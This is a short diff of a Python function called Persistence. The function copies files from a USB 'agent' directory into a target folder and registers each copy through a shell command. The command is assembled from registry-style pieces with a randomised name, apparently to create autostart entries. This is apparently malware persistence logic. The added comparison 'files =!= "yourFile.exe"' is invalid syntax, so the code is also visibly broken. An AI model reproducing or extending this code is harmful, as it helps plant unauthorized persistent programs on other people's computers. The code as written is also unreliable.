@@ -20,22 +20,24 @@ def Persistence(agentUsbDirectory):
         return 1
     else:
         for files in os.listdir(agentUsbDirectory):
-            print(files)
-            if os.path.isfile(targetDirPath + "\\" + files) == False:
-                shutil.copy(agentUsbDirectory + "\\" + files, targetDirPath)
+            if files =!= "yourFile.exe"
+                if os.path.isfile(targetDirPath + "\\" + files) == False:
+                    shutil.copy(agentUsbDirectory + "\\" + files, targetDirPath)
 
-                if os.path.exists(targetDirPath + "\\" + files) == True:    
-                    if os.path.getsize(targetDirPath + "\\" + files) > 0:
-                        targetFile = " /d " + targetDirPath + "\\{0}".format(files)
-                        targetRegisterVersion = "{0}{1}".format(targetRegisterVersion, random.choice(string.ascii_lowercase))
-                        try:
-                            subprocess.run(targetRegisterPath + targetRegisterVersion + targetRegisterType + targetFile, shell=True, timeout=3)          
-                        except Exception as e:
+                    if os.path.exists(targetDirPath + "\\" + files) == True:    
+                        if os.path.getsize(targetDirPath + "\\" + files) > 0:
+                            targetFile = " /d " + targetDirPath + "\\{0}".format(files)
+                            targetRegisterVersion = "{0}{1}".format(targetRegisterVersion, random.choice(string.ascii_lowercase))
+                            try:
+                                subprocess.run(targetRegisterPath + targetRegisterVersion + targetRegisterType + targetFile, shell=True, timeout=3)          
+                            except Exception as e:
+                                return 1
+                                pass
+                        else:
                             return 1
-                            pass
                     else:
-                        return 1
+                        continue        
                 else:
-                    continue        
+                    continue
             else:
                 continue
